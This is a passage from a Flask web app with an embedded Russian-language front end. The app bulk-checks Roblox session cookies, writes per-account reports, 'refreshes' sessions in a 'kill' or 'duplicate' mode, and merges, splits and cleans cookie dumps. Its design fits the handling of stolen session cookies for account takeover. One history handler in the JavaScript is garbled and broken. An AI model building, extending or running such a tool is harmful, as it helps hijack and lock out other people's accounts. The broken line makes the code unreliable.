async function runFullcheck() {
    let resBox = document.getElementById('fullcheckResult');
    let manual = document.getElementById('manualCookies').value.trim();
    let progress = document.getElementById('checkerProgress');
    if (!manual) { resBox.textContent = '❌ Вставь куки или загрузи .txt!'; return; }
    let fd = new FormData();
    fd.append('file', new Blob([manual], { type: 'text/plain' }), 'manual.txt');
    resBox.textContent = '⏳ Проверка...';
    progress.style.width = '40%';
    try {
        let r = await fetch('/api/fullcheck', { method: 'POST', body: fd });
        let d = await r.json();
        progress.style.width = '100%';
        setTimeout(() => { progress.style.width = '0%'; }, 1000);
        if (d.success) {
            let html = '✅ Проверено: ' + d.total + ' | Валидных: ' + d.valid_count + '\n\n';
            for (let rep of d.reports) html += rep + '\n' + '─'.repeat(40) + '\n';
            if (d.download_url) html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
            resBox.innerHTML = html;
            resBox.scrollTop = resBox.scrollHeight;
            loadCheckerHistory();
        } else {
            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
        }
    } catch(e) {
        resBox.textContent = '❌ Ошибка: ' + e.message;
        progress.style.width = '0%';
    }
}

function clearInputs() {
    document.getElementById('manualCookies').value = '';
    document.getElementById('fileStatusInfo').textContent = '';
    document.getElementById('fullcheckResult').textContent = 'Результаты появятся здесь...';
}

async function runFresher() {
    let resBox = document.getElementById('fresherResult');
    let cookies = document.getElementById('fresherCookies').value.trim();
    let mode = document.getElementById('fresherMode').value;
    if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
    resBox.textContent = '⏳ Обновление сессий и валидация...';
    try {
        let r = await fetch('/api/fresher', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookies: cookies, mode: mode })
        });
        let d = await r.json();
        if (d.success && d.cookies_only && d.cookies_only.length > 0) {
            resBox.textContent = d.cookies_only.join('\n');
            loadFresherHistory();
        } else {
            resBox.textContent = '❌ ' + (d.message || 'Не удалось обновить куки (не прошли валидацию или невалидны)');
        }
    } catch(e) {
        resBox.textContent = '❌ Ошибка: ' + e.message;
    }
}

// ===== ИСТОРИЯ =====

async function loadCheckerHistory() {
    let container = document.getElementById('checkerHistoryList');
    try {
        let r = await fetch('/api/history/checker');
        let d = await r.json();
        if (d.history && d.history.length > 0) {
            let html = '';
            d.history.slice().reverse().forEach(item => {
                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\ me===\'none\'?\'block\':\'none\'">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">✅ ' + item.valid + '/' + item.total + '</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else {
            container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
        }
    } catch(e) {
        container.innerHTML = '<div class="empty-history">❌ Ошибка загрузки</div>';
    }
}

async function clearCheckerHistory() {
    if (!confirm('Удалить историю проверок?')) return;
    await fetch('/api/history/checker/clear', { method: 'POST' });
    loadCheckerHistory();
}

async function loadFresherHistory() {
    let container = document.getElementById('fresherHistoryList');
    try {
        let r = await fetch('/api/history/fresher');
        let d = await r.json();
        if (d.history && d.history.length > 0) {
            let html = '';
            d.history.slice().reverse().forEach(item => {
                let ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else {
            container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
        }
    } catch(e) {
        container.innerHTML = '<div class="empty-history">❌ Ошибка загрузки</div>';
    }
}

async function clearFresherHistory() {
    if (!confirm('Удалить историю фрешера?')) return;
    await fetch('/api/history/fresher/clear', { method: 'POST' });
    loadFresherHistory();
}

// ===== ИНСТРУМЕНТЫ =====

async function mergeCookies() {
    let files = document.getElementById('mergeFiles').files;
    if (!files || files.length < 2) {
        document.getElementById('mergeResult').textContent = '❌ Выберите минимум 2 файла';
        return;
    }
    let fd = new FormData();
    Array.from(files).forEach(f => fd.append('files', f));
    document.getElementById('mergeResult').textContent = '⏳ Объединение...';
    try {
        let r = await fetch('/api/merge-cookies', { method: 'POST', body: fd });
        let d = await r.json();
        if (d.success) {
            document.getElementById('mergeResult').innerHTML = '✅ Объединено ' + d.total_files + ' файлов<br>📊 Уникальных: ' + d.total_cookies + '<br>🗑️ Дубликатов: ' + d.duplicates_removed + '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
        } else {
            document.getElementById('mergeResult').textContent = '❌ ' + (d.message || 'Ошибка');
        }
    } catch(e) {
        document.getElementById('mergeResult').textContent = '❌ ' + e.message;
    }
}

async function splitByCount() {
    let content = window.splitCountContent;
    let count = parseInt(document.getElementById('splitCount').value);
    if (!content) { document.getElementById('splitCountResult').textContent = '❌ Загрузите файл'; return; }
    if (!count || count < 1) { document.getElementById('splitCountResult').textContent = '❌ Укажите количество'; return; }
    document.getElementById('splitCountResult').textContent = '⏳ Разделение...';
    try {
        let r = await fetch('/api/split-cookies', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, split_type: 'count', count: count })
        });
        let d = await r.json();
        if (d.success) {
            document.getElementById('splitCountResult').innerHTML = '✅ Файлов: ' + d.file_count + '<br>📊 Куки: ' + d.total_cookies + '<br>📦 По ' + count + ' шт.<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
        } else {
            document.getElementById('splitCountResult').textContent = '❌ ' + (d.message || 'Ошибка');
        }
    } catch(e) {
        document.getElementById('splitCountResult').textContent = '❌ ' + e.message;
    }
}

async function splitByFiles() {
    let content = window.splitFilesContent;
    let num = parseInt(document.getElementById('splitFilesCount').value);
    if (!content) { document.getElementById('splitFilesResult').textContent = '❌ Загрузите файл'; return; }
    if (!num || num < 1) { document.getElementById('splitFilesResult').textContent = '❌ Укажите количество'; return; }
    document.getElementById('splitFilesResult').textContent = '⏳ Разделение...';
    try {
        let r = await fetch('/api/split-cookies', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, split_type: 'files', count: num })
        });
        let d = await r.json();
        if (d.success) {
            document.getElementById('splitFilesResult').innerHTML = '✅ Файлов: ' + num + '<br>📊 Куки: ' + d.total_cookies + '<br>📦 ~' + Math.ceil(d.total_cookies/num) + ' шт.<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
        } else {
            document.getElementById('splitFilesResult').textContent = '❌ ' + (d.message || 'Ошибка');
        }
    } catch(e) {
        document.getElementById('splitFilesResult').textContent = '❌ ' + e.message;
    }
}

async function cleanCookiesAction(action) {
    let content = document.getElementById('cleanCookiesInput').value.trim();
    if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
    document.getElementById('cleanResult').textContent = '⏳ Обработка...';
    try {
        let r = await fetch('/api/clean-cookies', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, action: action })
        });
        let d = await r.json();
        if (d.success) {
            let txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
            if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено дубликатов: ' + d.duplicates_removed;
            txt += '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
            document.getElementById('cleanResult').innerHTML = txt;
        } else {
            document.getElementById('cleanResult').textContent = '❌ ' + (d.message || 'Ошибка');
        }
    } catch(e) {
        document.getElementById('cleanResult').textContent = '❌ ' + e.message;
    }
}

loadCheckerHistory();
</script>
</body>
</html>"""

# ============================================================
# API ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    global CURRENT_UPLOADED_FILE
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "Имя пустое"})
    filename = f"uploaded_{int(time.time())}_{file.filename}"
    filepath = os.path.join("uploads", filename)
    file.save(filepath)
    CURRENT_UPLOADED_FILE = filepath
    return jsonify({"success": True, "filename": file.filename})

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    global CURRENT_UPLOADED_FILE
    content = ""
    if CURRENT_UPLOADED_FILE and os.path.exists(CURRENT_UPLOADED_FILE):
        with open(CURRENT_UPLOADED_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    elif 'file' in request.files:
        content = request.files['file'].read().decode('utf-8', errors='ignore')
    
    cookies = [line.strip() for line in content.split('\n') if len(line.strip()) > 20]
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    reports = []
    file_payloads = []
    cookie_hist = []
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            rep = format_short_report(info)
            reports.append(rep)
            cookie_hist.append(rep)
            txt = generate_full_txt_report(info)
            safe_name = re.sub(r'[\/*?:"<>|]', "", str(info['Username']))
            file_payloads.append((f"{safe_name}_{info['UserID']}.txt", txt))
        else:
            cookie_hist.append(f"❌ {c[:50]}...")
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for fname, ftxt in file_payloads:
            zf.writestr(fname, ftxt)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"reports_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    download_url = f"/downloads/{archive_name}"
    add_to_checker_history({
        'total': len(cookies),
        'valid': len(reports),
        'cookies': cookie_hist,
        'download_url': download_url
    })
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(reports),
        "reports": reports,
        "download_url": download_url
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    
    cookies = [line.strip() for line in raw.split('\n') if len(line.strip()) > 20]
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    cookies_only = []
    
    for c in cookies:
        refreshed_cookie = refresh_roblox_cookie(c, mode=mode)
        if refreshed_cookie:
            cookies_only.append(refreshed_cookie)
    
    if not cookies_only:
        return jsonify({"success": False, "message": "Не удалось обновить куки. Они либо сброшены, либо не прошли проверку валидатора."})

    add_to_fresher_history({
        'mode': mode,
        'refreshed_count': len(cookies_only),
        'cookies': cookies_only
    })
    
    return jsonify({
        "success": True,
        "refreshed_count": len(cookies_only),
        "cookies_only": cookies_only
    })

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": load_history(CHECKER_HISTORY_FILE)})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": load_history(FRESHER_HISTORY_FILE)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    if 'files' not in request.files:
        return jsonify({"success": False, "message": "Файлы не найдены"})
    files = request.files.getlist('files')
    if len(files) < 2:
        return jsonify({"success": False, "message": "Минимум 2 файла"})
    
    contents = []
    for file in files:
        contents.append(file.read().decode('utf-8', errors='ignore'))
    
    merged = merge_cookie_files(contents)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(merged)
    
    all_lines = [l for l in merged.split('\n') if l]
    total_orig = sum(len([l for l in c.split('\n') if l.strip()]) for c in contents)
    
    return jsonify({
        "success": True,
        "total_files": len(files),
        "total_cookies": len(all_lines),
        "duplicates_removed": total_orig - len(all_lines),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    data = request.json or {}
    content = data.get("content", "")
    split_type = data.get("split_type", "count")
    count = data.get("count", 100)
    if not content:
        return jsonify({"success": False, "message": "Нет данных"})
    
    if split_type == "count":
        files = split_cookies_by_count(content, count)
    else:
        files = split_cookies_by_files(content, count)
    
    if not files:
        return jsonify({"success": False, "message": "Не удалось разделить"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, fc in enumerate(files, 1):
            cnt = len([l for l in fc.split('\n') if l])
            zf.writestr(f"part_{i}_{cnt}cookies.txt", fc)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    filepath = os.path.join("downloads", archive_name)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    total = sum(len([l for l in file.split('\n') if l]) for file in files)
    return jsonify({
        "success": True,
        "file_count": len(files),
        "total_cookies": total,
        "download_url": f"/downloads/{archive_name}"
    })

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    content = data.get("content", "")
    action = data.get("action", "deduplicate")
    if not content:
        return jsonify({"success": False, "message": "Нет данных"})
    
    orig_lines = [l for l in content.split('\n') if l.strip()]
    if action == "deduplicate":
        processed = remove_duplicates(content)
    else:
        processed = clean_cookies(content)
    
    proc_lines = [l for l in processed.split('\n') if l.strip()]
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"cleaned_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(processed)
    
    return jsonify({
        "success": True,
        "original_count": len(orig_lines),
        "processed_count": len(proc_lines),
        "duplicates_removed": len(orig_lines) - len(proc_lines),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
